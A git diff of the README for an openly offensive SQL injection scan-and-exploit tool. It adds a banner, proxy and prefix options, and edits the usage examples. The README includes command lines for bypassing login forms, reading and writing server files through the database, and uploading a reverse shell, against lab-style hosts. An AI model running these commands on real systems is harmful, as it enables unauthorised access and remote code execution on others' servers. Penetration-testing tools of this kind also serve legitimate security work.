@@ -1,3 +1,17 @@
+
+#  ____   ____   ____   ____ _     _       _              _ 
+# |  _ \ / __ \ / /\ \ / ___| |__ / |____ | |_ ___   ___ | |
+# | |_) / / _` | |  | | |  _| '_ \| |_  / | __/ _ \ / _ \| |
+# |  _ < | (_| | |  | | |_| | | | | |/ /  | || (_) | (_) | |
+# |_| \_\ \__,_| |  | |\____|_| |_|_/___|  \__\___/ \___/|_|
+#        \____/ \_\/_/                                      
+
+##### Find all scripts in: https://github.com/roughiz
+
+
+##### SQLI script by R0()Gh1z
+# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
 # sql_injection
 A sql injection scan and exploit script
 
@@ -8,8 +22,10 @@ It scan if a parameter is injectable , and also find how to exploit it.
 ## Functions:
 
 ##### . Scan
-##### . Bypass an blind authentication Form with return message (true,false)
+##### . Bypass a blind authentication Form with return message (true,false)
 ##### . Found an injection
+##### . Define a startsWith of an injection
+##### . Use of proxy to debug
 ##### . Read a file from the DBMS
 ##### . Write a file into the DBMS
 ##### . Upload a reverse shell into the DBMS 
@@ -22,7 +38,7 @@ usage: sql_injection [-h] --data DATA [-m METHOD] [--file-dest REMOTEPAH]
                      [--file-write LOCALPATH] [--file-read PATHTOREAD]
                      [--upload-revshell REVSHELLPATH] [-H HEADER] [-c COOKIES]
                      -u URL -p PARAMETER [-ns BYPASS] [-s FOUND] [-l LEVEL]
-                     [-v VERBOSE]
+                     [--prefix PREFIX] [--proxy] [-v]
 
 A sql injection scan and exploit script
 
@@ -60,8 +76,11 @@ optional arguments:
   -l LEVEL, --level LEVEL
                         The level of the scan (l|h) "l" for little, and "h"
                         for huge
-  -v VERBOSE, --verbose VERBOSE
-                        Define verbose output. set to False by default
+  --prefix PREFIX       Define a prefix variable for the sqli. Per example "1
+                        "
+  --proxy               Use a default proxy at "127.0.0.1:8080". set to False
+                        by default
+  -v, --verbose         Define verbose output. set to False by default
 ```
 
 ## Examples
@@ -69,13 +88,13 @@ optional arguments:
 #### Bypass a form authetication returning a text when false
 
 ```
-$ sql_injection -u http://host/index.php --data "username=admin&password=admin" -p username -ns "Your Login Name or Password is invalid" -v 1
+$ sql_injection -u http://host/index.php --data "username=admin&password=admin" -p username -ns "Your Login Name or Password is invalid" 
 ```
 
 #### Bypass a form authetication returning a text when true
 
 ```
-$ sql_injection -u http://host/index.php --data "username=admin&password=admin" -p username -s "Success" -v 1
+$ sql_injection -u http://host/index.php --data "username=admin&password=admin" -p username -s "Success" 
 ```
 
 #### Found an injection
@@ -84,6 +103,11 @@ $ sql_injection -u http://host/index.php --data "username=admin&password=admin" 
 $ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "productId=1" -p productId 
 ```
 
+#### Found an injection with verbose mode and also using a local proxy
+
+```
+$ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "productId=1" -p productId -v --proxy
+```
 #### Read a file from the DBMS
 
 ```
@@ -99,7 +123,7 @@ $ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "produ
 #### Upload a reverse shell into the DBMS 
 
 ```
-$ sql_injection -u http://10.10.10.10:8080/complain/view.php -m GET -H "Agent:roughiz" --data "mod=admin&view=repod&id=plans" -p id  --cookie "PHPSESSID=9cc97jn016e2naklhp4rnj64j0"  --upload-revshell shell_cmd.php  -v 1
+$ sql_injection -u http://10.10.10.10:8080/complain/view.php -m GET -H "Agent:roughiz" --data "mod=admin&view=repod&id=plans" -p id  --cookie "PHPSESSID=9cc97jn016e2naklhp4rnj64j0"  --upload-revshell shell_cmd.php
 ```
 
 ## Poc
@@ -124,7 +148,7 @@ which web application language does the web server support?
 [2] ASPX
 [3] JSP
 [4] PHP (default)
->  
+> 
 [Reverse Shell Upload] Define destination directory path
 what do you want to use for writable directory?
 [1] Define a locations(s) path(s)
